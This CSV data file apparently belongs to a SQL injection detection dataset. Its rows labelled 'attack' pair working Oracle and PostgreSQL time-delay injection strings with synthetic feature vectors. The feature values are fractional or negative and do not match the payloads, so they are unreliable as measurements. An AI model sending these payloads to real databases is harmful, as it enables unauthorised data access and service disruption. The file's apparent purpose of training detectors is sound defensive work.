id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000191,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.5382838633379547,139.36135864257812,42.42467498779297,18.56410789489746,46.50471878051758,0.018826931715011597,53.84701156616211,22.51822853088379,1.1108417510986328,0.3000520169734955,0.16330339014530182,0.36677178740501404,0.14056959748268127,3.7049496173858643,1.0498721599578857,0.8456026911735535,1.0806654691696167,0.02989225834608078,0.08382437378168106,0.008671126328408718,4.092026233673096,4.72382926940918,1.6799002885818481,0.022615816444158554,1.5801060199737549,0.132236048579216,0.011685443110764027,0.1924665868282318,0.5863586664199829,0.518622636795044,0.029241075739264488,-0.16229791939258575,0.04596322029829025,0.04022356495261192,0.49450352787971497,1.6333526372909546,3.2165122032165527,0.7216159105300903,0.5817169547080994,-0.1338217556476593,0.3689723014831543,0.4253372251987457,-0.03674934804439545,-0.06277132779359818,-0.11642362177371979,0.06875324249267578,-0.23424486815929413,0.12388043850660324,0.15294261276721954,0.1418338268995285,0.04968371242284775,0.09138466417789459,-0.19529518485069275,0.03891710191965103,0.02265014499425888,-0.06937597692012787,-0.0061403061263263226,0.20464713871479034,0.05876237154006958,0.08809685707092285,-0.02207840234041214,0.05820853263139725,-0.0747000053524971,1.7685433626174927,0.05175156146287918,0.0075972420163452625,-0.00545478705316782,-0.010437369346618652,0.07431510835886002,0.06672242283821106,0.052208222448825836,-0.011850125156342983,0.13236360251903534,0.017126448452472687,0.19810877740383148,-0.006180424243211746,0.8921768069267273,0.47846201062202454,0.0095648393034935,0.07434975355863571,-0.03825932741165161,4.785759925842285,0.9564843773841858,0.23528914153575897,0.01590847223997116,0.10811751335859299,-0.05183098837733269,0.075055330991745,0.0045728525146842
GAN_000192,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.571583743521511,133.44471740722656,41.18155288696289,15.679108619689941,46.024906158447266,-0.03254920616745949,52.334991455078125,25.642108917236328,1.1500961780548096,0.2618640065193176,0.16874101758003235,0.3746320605278015,0.14212310314178467,3.6543099880218506,1.1455683708190918,1.3256564140319824,1.1836527585983276,0.043108392506837845,0.09213139861822128,0.025624094530940056,4.208390712738037,3.9125096797943115,1.640952229499817,0.009506672620773315,1.519729733467102,0.17950841784477234,-0.00506869750097394,0.019942747429013252,0.5702924728393555,0.5983606576919556,0.023602403700351715,-0.10044381022453308,0.034233834594488144,0.1419353038072586,0.5228906869888306,1.5574567317962646,2.6328115463256836,0.5736693143844604,0.6457549929618835,-0.07951097935438156,0.3995879590511322,0.46349480748176575,0.049141403287649155,-0.02327645570039749,0.02802065759897232,0.02226315438747406,-0.12124162167310715,0.13695235550403595,0.09990499913692474,0.16205257177352905,-0.029685229063034058,0.14017926156520844,-0.08971439301967621,0.05219016224145889,-0.10026023536920547,-0.1999732106924057,-0.006961324717849493,0.1886894404888153,0.11484567821025848,0.016000133007764816,-0.09571711719036102,0.08891603350639343,-0.28779107332229614,2.115053415298462,0.1809653341770172,-0.00243202387355268,0.009070655331015587,0.3289274275302887,0.2080848515033722,0.08128474652767181,0.022086523473262787,-0.17656269669532776,0.15545770525932312,0.03850662708282471,0.3964119255542755,0.049473248422145844,0.9697577357292175,0.32793280482292175,-0.20313110947608948,-0.002907274989411235,0.08168931305408478,4.283225059509277,1.0035043954849243,0.1375020444393158,-0.24663767218589783,0.15297728776931763,0.11840736865997314,0.2572464644908905,-0.010283324867486954
GAN_000193,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5526915415219062,137.79811096191406,43.74208450317383,17.47001838684082,48.88501739501953,0.008797697722911835,52.75404739379883,22.68584442138672,0.9846011996269226,0.2879393994808197,0.15829050540924072,0.36584940552711487,0.14047807455062866,3.656069755554199,1.1052048206329346,1.1034808158874512,1.1781761646270752,0.026447538286447525,0.1151227056980133,0.00818066019564867,3.2374374866485596,4.980237007141113,1.6744877099990845,0.018188202753663063,1.5237621068954468,0.15524296462535858,0.006360383238643408,0.10965345799922943,0.966804563999176,0.563613772392273,0.03030998259782791,-0.10754015296697617,0.0598263218998909,0.15728293359279633,0.5364987254142761,1.6114753484725952,2.907726526260376,0.7459273338317871,0.5354555249214172,-0.24656273424625397,0.37273532152175903,0.4555807411670685,-0.1053960770368576,-0.040807999670505524,-0.1330600380897522,0.03191398084163666,-0.16937978565692902,0.11755914986133575,0.15381279587745667,0.16342467069625854,0.01319219172000885,0.08862568438053131,-0.1614786833524704,0.13878557085990906,-0.009445646777749062,0.0661388486623764,-0.0030432227067649364,0.26035067439079285,0.059957996010780334,0.09149004518985748,-0.010975010693073273,0.08899466693401337,-0.07357814162969589,1.7982444763183594,0.03438716009259224,-0.006567449774593115,0.0003936512512154877,0.08716163784265518,0.17819708585739136,0.15452969074249268,-0.007508538663387299,-0.12157773226499557,0.14786024391651154,0.03576469421386719,0.1619957536458969,-0.0790393054485321,1.0270658731460571,0.42727455496788025,-0.06274662166833878,-0.00438018050044775,-0.0629877895116806,4.368393421173096,0.9723819494247437,0.15833178162574768,-0.027960404753684998,0.03410682827234268,0.08891431987285614,0.11684496700763702,0.0027856898959726095
GAN_000194,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.6039517486709194,133.32687377929688,36.83976364135742,17.65299415588379,48.773616790771484,0.03662373498082161,58.50321960449219,22.30229377746582,0.9100215435028076,0.30104002356529236,0.1671680361032486,0.3609403967857361,0.1393543928861618,3.6459672451019287,0.8256586790084839,0.6819065809249878,0.9598088264465332,0.03528045117855072,0.04882440343499184,0.011205606162548065,3.4566588401794434,4.572264194488525,1.3718860149383545,0.02541879191994667,1.5951234102249146,0.2635549008846283,-0.01667024753987789,0.20522378385066986,0.7306875586509705,0.504277229309082,0.028568342328071594,-0.2240532785654068,0.054148852825164795,-0.07476282119750977,0.4272134304046631,1.7164984941482544,3.530776262283325,0.7999200224876404,0.5188615918159485,-0.13016675412654877,0.3747943937778473,0.4604775011539459,0.04517173022031784,-0.02998260408639908,0.10954168438911438,-0.056509651243686676,-0.1345776915550232,0.11448721587657928,0.13279466331005096,0.14842915534973145,0.06963511556386948,0.05746413767337799,-0.16330556571483612,0.08249305933713913,0.11443556100130081,-0.057251766324043274,-0.01675189472734928,0.17566965520381927,-0.012643769383430481,0.15220195055007935,0.036546096205711365,0.0026457607746124268,-0.041406504809856415,2.111193895339966,0.16260074079036713,0.0390671044588089,-0.009450803510844707,0.1634853482246399,0.07477954030036926,0.011846408247947693,-0.012932762503623962,-0.07047048211097717,0.07458525151014328,0.0122480234131217,0.0726761594414711,0.05006551742553711,0.9144728779792786,0.4539007544517517,-0.059207506477832794,0.10909096896648407,0.12384656816720963,4.991310119628906,0.9567775130271912,0.24495089054107666,0.01214928925037384,-0.0404868945479393,-0.11373305320739746,0.010839227586984634,0.007048682775348425
GAN_000195,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.7977247342995266,127.52872467041016,31.600217819213867,17.980314254760742,38.181270599365234,0.02244139462709427,63.18570327758789,24.86079978942871,1.3046749830245972,0.2596827447414398,0.17978322505950928,0.3675081431865692,0.1406392753124237,3.546841859817505,0.5168886780738831,0.8706672787666321,1.1102275848388672,0.07778659462928772,0.03127643093466759,0.005822860170155764,3.2030017375946045,4.109081268310547,0.7642809748649597,0.025882860645651817,1.6037695407867432,0.3159012198448181,-0.04138918220996857,0.20299391448497772,0.7023025751113892,0.42451363801956177,0.05017010122537613,-0.11476688086986542,0.038569387048482895,0.163251131772995,0.4933704435825348,1.7373605966567993,2.593038558959961,0.5562726259231567,0.4188951849937439,-0.059047747403383255,0.3574420213699341,0.40459173917770386,-0.0005385428667068481,-0.07561381906270981,0.17599816620349884,-0.07735706120729446,-0.19523942470550537,0.1413080245256424,0.14277532696723938,0.11415759474039078,0.02791706472635269,0.04982595890760422,-0.41612523794174194,0.08420560508966446,-0.009574760682880878,0.02260291576385498,-0.014377322047948837,0.35230210423469543,-0.19630885124206543,0.07013706862926483,0.10127025842666626,0.2267637550830841,-0.12149108201265335,2.479322910308838,0.6032410860061646,0.037525251507759094,0.03099883534014225,0.12940460443496704,0.027116557583212852,-0.2057754397392273,0.08547376096248627,-0.3069201409816742,-0.017359543591737747,0.013891764916479588,0.16601720452308655,0.3330617845058441,0.8414989709854126,0.32388803362846375,-0.12405257672071457,0.1119028702378273,-0.03338341414928436,3.7010293006896973,0.9593847990036011,0.3110223412513733,-0.37394678592681885,0.05406516417860985,-0.17085789144039154,-0.08522011339664459,-0.017331119626760483
GAN_000196,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.6091129625201392,121.35667419433594,40.08731460571289,17.24344825744629,44.234317779541016,-0.02638043463230133,53.97830581665039,25.71381950378418,1.2065777778625488,0.25082212686538696,0.18072351813316345,0.3711559474468231,0.1385723501443863,3.5709054470062256,1.1162357330322266,0.9818024039268494,1.220680832862854,0.07023313641548157,0.05685510113835335,0.016570573672652245,3.9315342903137207,4.687126636505127,1.5277174711227417,0.016596198081970215,1.4497780799865723,0.2116674780845642,-0.02238125167787075,0.07686272263526917,0.28384795784950256,0.5296577215194702,0.025886710733175278,-0.06686456501483917,0.035913873463869095,0.1845981776714325,0.5748277902603149,1.6398420333862305,2.6941614151000977,0.5632179379463196,0.49340060353279114,-0.07858606427907944,0.37567636370658875,0.42381739616394043,-0.097113236784935,-0.1567327380180359,0.06996431946754456,-0.01881561428308487,-0.13283775746822357,0.08511601388454437,0.14335140585899353,0.13611705601215363,-0.11286766827106476,0.056326210498809814,-0.028184600174427032,0.06328808516263962,-0.09784069657325745,-0.08706966042518616,0.00516342930495739,0.2609792947769165,0.0006199851632118225,0.11710968613624573,0.0014109015464782715,-0.013818632811307907,-0.09095808118581772,2.3361310958862305,0.23467044532299042,0.02119658701121807,0.023280169814825058,-0.008610904216766357,0.06455031782388687,0.006003759801387787,0.062145788222551346,-0.23148992657661438,0.044665537774562836,0.03722098097205162,0.17439542710781097,0.0463811457157135,1.094313144683838,0.47752660512924194,-0.2577240765094757,0.01984483189880848,0.042452774941921234,3.9551570415496826,1.0167964696884155,0.2773279547691345,-0.22970861196517944,0.08527539670467377,0.08238141238689423,0.15333394706249237,-0.00859435461461544
GAN_000197,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,4.044021027342526,129.23085021972656,39.72514343261719,15.010522842407227,37.91999435424805,0.019528798758983612,60.572776794433594,27.361600875854492,1.385619044303894,0.22403451800346375,0.18119215965270996,0.39141249656677246,0.13663074374198914,3.467881679534912,0.42544400691986084,1.573262095451355,1.3884268999099731,0.0732913389801979,0.0690784826874733,0.001115418621338904,3.415400981903076,3.581188440322876,1.072648286819458,0.02203458547592163,1.5948336124420166,0.20408029854297638,-0.015965336933732033,-0.026537848636507988,0.5308683514595032,0.5036512613296509,0.04164150729775429,0.10012058168649673,0.016913533210754395,0.1732063740491867,0.5918278694152832,1.7133599519729614,1.7745264768600464,0.5127547383308411,0.4983530044555664,0.02270004153251648,0.3380909562110901,0.40724554657936096,-0.23396189510822296,0.018572207540273666,0.10906711220741272,-0.23113912343978882,-0.2822503447532654,0.1297663152217865,0.09705090522766113,0.14545777440071106,-0.15199723839759827,0.010532371699810028,-0.4169093668460846,0.3768817186355591,-0.09589412808418274,-0.21018876135349274,0.0027442099526524544,0.3473198115825653,0.1560838371515274,-0.01474016159772873,0.19558772444725037,0.11584343016147614,-0.3086153566837311,2.0674538612365723,0.6128424406051636,-0.009524086490273476,0.053430136293172836,0.2069837749004364,0.10700445622205734,-0.022437743842601776,0.20311132073402405,-0.2736883759498596,-0.04459679499268532,0.03642634302377701,0.6103770732879639,0.15390567481517792,1.1227079629898071,0.44924724102020264,-0.14493989944458008,-0.059045761823654175,0.04217012971639633,3.0680603981018066,1.0000003576278687,0.3266981840133667,-0.3491480052471161,0.09409041702747345,0.08891935646533966,0.04193791374564171,-0.018629521131515503
GAN_000198,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.7351438946298035,128.16746520996094,37.83292007446289,17.181243896484375,49.17634201049805,-0.051813848316669464,54.986328125,26.489643096923828,0.9397078156471252,0.27830126881599426,0.18367557227611542,0.3578851521015167,0.14245222508907318,3.6367955207824707,1.3402947187423706,0.7648847103118896,1.1377637386322021,0.07599697262048721,0.06794591248035431,0.028941314667463303,4.55782413482666,4.049304008483887,1.7369749546051025,0.00982829462736845,1.4522581100463867,0.2709609568119049,-0.03507993742823601,0.052163008600473404,0.36075547337532043,0.5603166222572327,0.01481819711625576,-0.35684776306152344,0.07562506943941116,0.07151729613542557,0.523604154586792,1.6954537630081177,3.3710832595825195,0.7639305591583252,0.5937639474868774,-0.13408991694450378,0.40423423051834106,0.3549635112285614,0.039896272122859955,-0.03851969540119171,0.1302238255739212,0.02118336409330368,0.08347202837467194,0.08678143471479416,0.16023331880569458,0.21774330735206604,-0.050452396273612976,0.08029285818338394,0.12798362970352173,-0.18270474672317505,-0.2119358330965042,-0.10114216804504395,0.005266290623694658,0.2040766030550003,-0.09221763908863068,0.3332088887691498,-0.06638425588607788,-0.030664198100566864,-0.04802411049604416,2.86932635307312,0.031985193490982056,0.031750500202178955,0.002028045943006873,0.07671821862459183,0.08075719326734543,0.09901724010705948,-0.04480145126581192,-0.10207964479923248,0.25616559386253357,0.02775753289461136,0.15159620344638824,-0.06101607903838158,1.0173879861831665,0.45282185077667236,-0.27478185296058655,0.10267750918865204,0.06633409857749939,4.7373433113098145,1.0223665237426758,0.24786096811294556,-0.08527626097202301,0.1944587528705597,0.07528959214687347,0.1666942685842514,0.003035077592357993
GAN_000199,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.8252496039832375,129.64329528808594,29.806304931640625,17.334871292114258,38.5708122253418,0.032361336052417755,65.53154754638672,23.75819969177246,0.9585467576980591,0.28351184725761414,0.1747378557920456,0.36395761370658875,0.1396426111459732,3.63179612159729,0.5953795313835144,0.8157892227172852,0.9060090184211731,0.051049623638391495,0.03980637341737747,0.00674003129824996,4.5873026847839355,4.637242794036865,0.9712183475494385,0.031565580517053604,1.6059974431991577,0.34093809127807617,-0.015439330600202084,0.15055213868618011,0.8095532059669495,0.4972313642501831,0.03762303665280342,-0.27672243118286133,0.06129063293337822,-0.07774388790130615,0.41698190569877625,1.8329150676727295,3.3166005611419678,0.7502800226211548,0.5623798966407776,-0.15742650628089905,0.4945084750652313,0.4725075364112854,0.0002836063504219055,-0.11381464451551437,0.32322412729263306,-0.10278777033090591,-0.18412382900714874,0.1426781564950943,0.15172754228115082,0.1995321661233902,0.07154074311256409,0.046374864876270294,-0.2845972180366516,0.21247252821922302,0.15029235184192657,-0.1267240047454834,-0.01776849664747715,0.25783902406692505,-0.011826694011688232,0.3225867450237274,0.13564179837703705,0.11850464344024658,-0.1775856912136078,2.184983015060425,0.4463737905025482,0.05369081348180771,-0.002044354798272252,0.31891438364982605,0.0041747745126485825,-0.12411882728338242,-0.06863916665315628,-0.11622079461812973,0.14687533676624298,-0.012090903706848621,0.15345807373523712,0.08378908783197403,0.8494361639022827,0.39787793159484863,-0.11960824579000473,0.12033573538064957,0.08039114624261856,4.89581298828125,1.0158665180206299,0.28838297724723816,-0.08840025961399078,0.013326629996299744,-0.13709820806980133,0.03743722662329674,0.01655181497335434
GAN_000200,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.5753929431820586,134.24256896972656,39.6526985168457,18.325956344604492,47.58367156982422,-0.006287635304033756,53.6601448059082,23.134984970092773,1.0520908832550049,0.29081156849861145,0.16364635527133942,0.3591136038303375,0.1451355218887329,3.6573283672332764,1.3325767517089844,0.8361638784408569,1.101668119430542,0.04796570539474487,0.05309613049030304,0.022217895835638046,3.8289597034454346,4.27953577041626,1.7229012250900269,0.014315023086965084,1.5201808214187622,0.14942604303359985,0.003272335510700941,0.21837788820266724,0.7529122829437256,0.5893226861953735,0.02737182192504406,-0.3036441504955292,0.09282645583152771,0.1867840588092804,0.423124760389328,1.6663578748703003,2.874915361404419,0.5950229167938232,0.5451721549034119,-0.07886198908090591,0.39148396253585815,0.44705209136009216,0.26093292236328125,-0.05786579102277756,0.13046933710575104,0.11415190994739532,-0.1548519730567932,0.13460120558738708,0.10205712169408798,0.15134795010089874,0.04418881982564926,0.12733173370361328,-0.013217665255069733,-0.07378983497619629,-0.00669849244877696,-0.01725003868341446,0.0005472646444104612,0.17142538726329803,-0.13043975830078125,0.12595459818840027,-0.05613313242793083,-0.011168882250785828,0.003944031894207001,2.0105278491973877,0.06884901970624924,0.025209607556462288,-0.006567333824932575,0.05596821755170822,0.11050671339035034,-0.004804141819477081,-0.008600465953350067,-0.12882983684539795,0.03247927129268646,0.029015175998210907,0.13774442672729492,0.14279423654079437,0.914019763469696,0.39219245314598083,-0.1534111499786377,0.1056806892156601,0.04798506945371628,5.424709320068359,0.9562790989875793,0.21296411752700806,-0.12996190786361694,0.10135650634765625,-0.09542535245418549,0.17074012756347656,0.000968553067650646
